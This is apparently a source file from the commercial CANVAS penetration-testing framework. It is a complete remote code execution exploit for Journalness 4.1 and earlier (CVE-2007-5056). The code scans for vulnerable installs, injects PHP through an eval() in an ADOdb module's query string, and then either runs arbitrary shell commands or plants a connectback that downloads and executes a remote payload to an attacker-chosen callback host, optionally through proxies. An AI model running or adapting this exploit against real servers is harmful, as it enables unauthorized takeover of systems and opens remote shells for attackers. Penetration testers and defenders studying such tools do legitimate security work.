#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import string
import re
import random

# path appends
if '.' not in sys.path: 
	sys.path.append('.')

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy
import urllib
import canvasengine
from phplistener import get_php_stage1

NAME="Journalness <= 4.1 Remote Code Execution exploict"
DESCRIPTION="Journalness <= 4.1 Remote Code Execution exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="ADOdb"
DOCUMENTATION["References"]='http://securityreason.com/exploitalert/3359'
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2007-5056"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5056"
DOCUMENTATION['CVSS'] = 6.8

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""

"""

CHANGELOG="""

"""


class theexploit(tcpexploit):
	def __init__(self):
		tcpexploit.__init__(self)

		self.port = 80
		self.host = ""
		self.badstring = "\x00"
		self.setVersions()
		self.version = 1
		self.done = 0
		self.name = NAME    
		self.basepath = "/"
		self.command = ""
		self.basicauth_user = ""
		self.basicauth_password = ""
		self.hostname = None
		
		# set to none for no-proxy by default ..
		self.first_proxy = None
		self.second_proxy = None
		
		return

	def usage(self):
		print "Base options:"
		print "-v <version> -t <target ip> -l <callback ip> -d <callback port>"
		print "Additional options:"
		print "-O basepath:basepath -O command:command -O basicauth_user:username -O basicauth_password:password -O hostname:hostname"
		return
	
	def getargs(self):
		"""
        Get arguments for attack
        """
		self.host = self.target.interface
		self.port = int(self.argsDict.get("port", self.port))
		
		self.basepath = self.argsDict.get("basepath", self.basepath)
		self.command = self.argsDict.get("command", self.command)
		self.basicauth_user = self.argsDict.get("basicauth_user", self.basicauth_user)
		self.basicauth_password = self.argsDict.get("basicauth_password", self.basicauth_password)
		self.hostname = self.argsDict.get("hostname", self.hostname)
		self.ssl = self.argsDict.get("ssl", self.ssl)
		
		# get proxies to use ..
		self.first_proxy = self.argsDict.get("first_proxy", self.first_proxy)
		self.second_proxy = self.argsDict.get("second_proxy", self.second_proxy)
		self.log("Got proxies: %s %s"% (self.first_proxy, self.second_proxy))
		
		if self.hostname in [None, ""]:
			allhosts = self.target.get_knowledge("www_hostnames")
			if allhosts == None:
				allhosts = ["%s"%self.host]
		else:
			allhosts = [self.hostname]
			
		self.allhosts = allhosts
		return 

	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions = {}
		self.versions[1] = [""]

	def neededListenerTypes(self):
		return [canvasengine.PHPMULTI]

	def test(self):
		"""
        Quicky banner check - looks for comon basepaths
        """
		self.getargs()
		self.log("Using basepath=%s"%self.basepath)
		self.log("Using vhost=%s"%self.hostname)
		if self.ssl:
			protocol = "https"
		else:
			protocol = "http"

		for hostname in self.allhosts:
			self.log("Testing hostname: %s"%hostname)

			#automatically check out some common basepaths, starting with the one specified
			for basepath in [self.basepath, "/journal/","/journalness/","/"]:
				self.log("Testing for basepath: %s"%basepath)

				#If we have to do basic-auth, let's get an object from spkproxy here
				if self.basicauth_user:
					auth = spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
				else:
					auth = None 

				#this is the main call that does the magic here...
				fd = spkproxy.urlopen(protocol+"://"+self.host+':%s'%self.port+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
				data = fd.read()

				#now that we have the web page - we parse it and look for vulnerable versions
				#list of vulnerable versions so far
				for s in ["Journalness"]:
					#self.log("Data=%s"%data) #print out web page (big)
					if s in data:
						self.log("Found Potential vulnerable Journalness in vhost %s at basepath %s"%(hostname, basepath))
						self.argsDict["basepath"] = basepath
						self.basepath = basepath
						self.hostname = hostname
						self.version = 1
						return 1
		return 0
	
	def do_url_connect(self, host_info, proxy=None):
		""" do basic http auth if needed .. connect to url """

		# ssl flag toggles to https
		if host_info['ssl']:
			protocol = "https"
		else:
			protocol = "http"

		#If we have to do basic-auth, let's get an object from spkproxy here
		if host_info['user']:
			auth = spkproxy.BasicAuth(host_info['user'], host_info['password'])
		else:
			auth = None

		if not proxy:
			UA = spkproxy.UserAgent(protocol+"://"+host_info['host']+':%s'% host_info['port']+"/"+host_info['basepath'], \
								auth=auth, hostname=host_info['hostname'], exploit=self)
		else:
			self.log("Using web proxy: %s"% proxy)
			UA = spkproxy.UserAgent(protocol+"://"+host_info['host']+':%s'% host_info['port']+"/"+host_info['basepath'], \
								auth=auth, hostname=host_info['hostname'], exploit=self, \
								proxyhost=proxy.split(':')[0], proxyport=int(proxy.split(':')[1]))			
		return UA

	
	def do_command(self, ua, command, backshell):
		""" call a command via the placed php shell """

		ret = None		
		if command not in ["", None]: # we have a single command to exec
			data = ua.GET("includes/database/adodb-perf-module.inc.php?last_module=t{};%%20class%%20t{};eval($_GET[s]);//;&s=%s"%(urllib.quote_plus(self.command)))
			if "startz" in data:
				result = data.split("startz")[1].split("endz")[0]
				self.log("Command result=%s"%prettyprint(result))
				ret = 1
			else:
				self.log("Command not run - service patched?!")
		else: # we want a MOSDEF php thingamaging
			# place the backshell
			data = ua.GET("includes/database/adodb-perf-module.inc.php?last_module=t{};%%20class%%20t{};eval($_GET[s]);//;&s=%s"%(urllib.quote_plus(backshell)))
			self.log("Looking for PHP connectback")
			ret = self.ISucceeded()
			
		return ret
	
		
	def run(self):
		self.getargs()

		self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
		if self.version == 0:
			ret = self.test()
			if not ret:
				self.log("Testing didn't find vulnerable target")
				return 0

		self.log("Attacking %s:%d"%(self.host,self.port))
		self.log("Basic Auth User: %s"%self.basicauth_user)
		self.log("VHost: %s"%self.hostname)
		
		host_info = {}
		# set host info dict
		host_info['ssl'] = self.ssl
		host_info['user'] = self.basicauth_user
		host_info['password'] = self.basicauth_password
		host_info['host'] = self.host
		host_info['port'] = self.port
		host_info['hostname'] = self.hostname
		host_info['basepath'] = self.basepath
		#ua.addHeader("Host","%s"%(self.host))
		# get a url agent object for first register .. these need to be proxied
		ua = self.do_url_connect(host_info, self.first_proxy)
		ua.addHeader("Host","%s"%(self.host))
		#we either do a command or a backshell
		if self.callback:
			backshell = self.get_php_to_mosdef(self.callback.ip, self.callback.port)
			
		if self.command not in ["", None]:
			self.command="print(startz);passthru(\""+self.command+"\");print(endz);".strip()			
			backshell = None
			
		# do the command .. command of None will expect backshell to be set
		ret = self.do_command(ua, self.command, backshell)

		if ret:
			self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
		else:
			self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
			
		return ret

	def get_php_to_mosdef(self, host, port):
		"""
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """      
		self.log("Using PHPMULTI callback of %s:%d"% (host, port))
		badchars = ''
		ret = get_php_stage1(badchars, host, port)
		return ret

	def shutdown(self):
		self.done = 1

if __name__ == '__main__':
	print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)

